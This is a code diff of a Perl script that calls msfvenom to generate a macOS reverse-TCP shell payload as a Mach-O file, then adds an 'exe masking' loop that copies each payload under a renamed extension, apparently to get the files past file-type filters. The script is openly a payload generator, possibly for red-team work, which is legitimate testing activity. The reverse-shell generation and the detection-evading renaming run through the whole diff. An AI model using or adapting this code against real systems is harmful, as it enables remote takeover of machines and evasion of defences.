@@ -207,14 +207,28 @@ use warnings;
  `touch $targetFolder/500-Stalwart-run975.cue`;
 
   $platform_arch = "--platform OSX -a x86";
-  $encoder = "-e generic/none";
+  $encoder = '-e generic/none -b "\x00"';
   $payload = "-p osx/x86/shell_reverse_tcp";
-  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho $encoder > $targetFolder/501-Stalwart-shell.macho";
+  $cmd ="msfvenom ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/501-Stalwart-shell.macho";
   print "\n\n*** Meterpreter mac: $cmd\n";
   `$cmd`;
 
+  ###################
+  ##
+  ##  exe masking
+  ##
+  ##################
 
-
+  my($originalFile,$maskedFile);
+  opendir (DIR, $targetFolder) or die $!;
+  while (my $originalFile = readdir(DIR)) {
+    $_ = $originalFile;
+    if (/cue$/ || /txt$/){next;}
+    $maskedFile = $originalFile;
+    $maskedFile =~ s/.$/_/;
+    `cp $targetFolder/$originalFile $targetFolder/$maskedFile`; 
+  }
+  closedir(DIR);
 
 
 
